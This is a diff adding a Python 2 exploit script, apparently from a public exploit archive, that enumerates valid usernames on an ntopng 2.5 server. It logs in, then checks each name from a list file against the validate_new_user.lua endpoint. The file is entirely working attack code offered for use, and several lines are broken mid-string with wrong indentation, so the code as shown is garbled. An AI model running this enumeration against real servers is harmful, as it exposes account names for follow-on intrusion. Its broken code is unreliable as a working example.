@@ -1,0 +1,48 @@
+# Exploit title: ntopng user enumeration
+# Author: Dolev Farhi
+# Contact: dolevf at protonmail.com
+# Date: 04-08-2016
+# Vendor homepage: ntop.org
+# Software version: v.2.5.160805
+
+#!/usr/env/python
+import os
+import sys
+import urllib
+import urllib2
+import cookielib
+
+server = 'ip.add.re.ss'
+username = 'ntopng-user'
+password = 'ntopng-password'
+timeout = 6
+
+if len(sys.argv) < 2:
+    print("usage: %s <usernames file>") % sys.argv[0]
+    sys.exit(1)
+
+if not os.path.isfile(sys.argv[1]):
+    print("%s doesn't exist") % sys.argv[1]
+    sys.exit(1)
+
+try:
+    cj = cookielib.CookieJar()
+    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+    login_data = urllib.urlencode({'user' : username, 'password' :
+password, 'referer' : '/authorize.html'})
+    opener.open('http://' + server + ':3000/authorize.html', login_data,
+timeout=timeout)
+    print("\nEnumerating ntopng...\n")
+    with open(sys.argv[1]) as f:
+    for user in f:
+        user = user.strip()
+        url = 'http://%s:3000/lua/admin/validate_new_user.lua?user=%s&netw
+orks=0.0.0.0/0,::/0' % (server, user)
+          resp = opener.open(url)
+        if "existing" not in resp.read():
+            print "[NOT FOUND] %s" % user
+        else:
+            print "[FOUND] %s" % user
+except Exception as e:
+    print e
+    sys.exit(1)
